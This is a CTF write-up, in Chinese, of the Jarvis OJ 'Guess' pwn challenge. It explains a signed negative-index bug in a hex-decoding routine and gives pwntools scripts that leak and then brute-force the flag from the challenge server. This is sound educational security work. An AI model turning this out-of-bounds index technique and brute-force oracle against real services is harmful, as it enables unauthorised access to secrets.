---
title: Jarvis OJ - Guess の Write-Up
date: 2020-08-31 16:41:05
categories:
- WriteUPs
- JarvisOJ
tags:
- PWN
- Stack
---
## Step 1

首先尝试运行程序，发现没有任何回显：

![](/img/Guess/Guess1.png)

<!-- more -->

checksec一下：

![](/img/Guess/Guess2.png)

开启了DEP，栈上不可执行。

## Step 2

将程序丢到IDA中，首先是main函数：

![](/img/Guess/Guess3.png)

这很明显是一个socket服务器端的代码，监听的端口是0x270f即9999。nc上去看一下：

![](/img/Guess/Guess4.png)

再回到程序中去看下处理函数handle()：

![](/img/Guess/Guess5.png)

首先有一个alarm定时函数超时退出，会影响动态调试，可以把这个函数用NOP patch掉。后面接收的输入长度和申明的变量长度一致，不存在溢出。

接着是rtrim()函数：

![](/img/Guess/Guess6.png)

这个函数把输入的字符串下标为奇数位的位置清０，但是gdb attach上去看了一下发现并没有改变。

根据逆向的伪代码发现是通过fork创建子程序而不是多线程，所以需要找一下具体子程序的进程号：

![](/img/Guess/Guess7.png)

152是父进程的进程号，`nc 127.0.0.1 9999`之后程序会fork一个子进程，进程号为155。接下来`gdb attach 155`看下子进程的堆栈信息：

![](/img/Guess/Guess8.png)

在连接的程序界面输入100个‘1’跳过第一段输入字符长度的检测：

![](/img/Guess/Guess9.png)

在执行rtrim()函数之前的位置下个断点：

![](/img/Guess/Guess10.png)

再在执行完rtrim()函数后下个断点：

![](/img/Guess/Guess11.png)

发现输入的字符串并没有改变……那就跳过不管了。最后调用了is_flag_correct()函数：

![](/img/Guess/Guess12.png)

该函数首先检测输入的字符串长度是不是100，输入存放在flag_hex。然后将0x401100位置的数据复制到bin_by_hex，0x401100位置的数据除了0-9以及大小写ABCDEF之外都是0xFF。接着将FAKE{9b355e394d2070ebd0df195d8b234509cc29272bc412}赋给flag（当然这是假的flag）。

接下来是函数的主体部分，对用户输入的字符串进行处理，每两位为一组，循环50次。将输入的字符在bin_by_hex中寻找对应的值，如果不在0-9以及大小写ABCDEF中时退出程序。然后通过’｜’运算将输入的100字节长度的字符串变为50字节长度，再比较given_flag和flag，返回比较结果。

这里是将flag_hex字符串的ASC II值当作bin_by_hex的索引，相当于将原来char类型的变量转换成了int类型，就会造成问题。当我们控制输入的字符串最终变为负数的索引时，程序就会回去找对应的值。

而根据栈的布局，bin_by_hex的地址是高于flag的，结合上一句提到的负索引问题，我们就可以实现将given_flag设置为真正的flag从而通过检验。

但是我们依然不清楚真正的flag是什么，所以将正确的flag修改每一位，猜测每一位，这样最终猜解出来flag。

## Step 3

分析结束就是具体怎么利用了，首先根据id_flag_correct函数bin_by_hex和flag相距0x40即64，所以我们需要控制索引每位减64。

测试脚本如下：

```Python
from pwn import *

context.log_level = 'debug'

sh = remote('pwn.jarvisoj.com', 9878)

payload = ""
for i in range(50):
    payload += "0" + chr(0x40 + 128 + i)

sh.recvuntil("guess> ")
sh.sendline(payload)

sh.recv()
sh.close()
```

运行结果如下图所示：

![](/img/Guess/Guess13.png)

可见我们成功的将given_flag设置为了真正的flag，通过了检测。下一步就是要尝试一个一个的爆破，获取正确的flag：

```Python
from pwn import *
import string

# context.log_level = 'debug'

sh = remote('pwn.jarvisoj.com', 9878)

payload = ""
for i in range(50):
    payload += "0" + chr(0x40 + 128 + i)

sh.recvuntil("guess> ")

shellcode = list(payload)
flag = ""
for i in range(50):
    for j in string.printable:
        shellcode[2 * i]  = j.encode('hex')[0]
        shellcode[2 * i + 1] = j.encode('hex')[1]
        sh.sendline("".join(shellcode))
        print "".join(str(i) for i in shellcode)

        ans = sh.recvline()
        print ans

        if ('Yaaaay!' in ans) == 1:
            flag += j
            break

print flag

sh.close()
```

脚本运行结果：

![](/img/Guess/Guess14.png)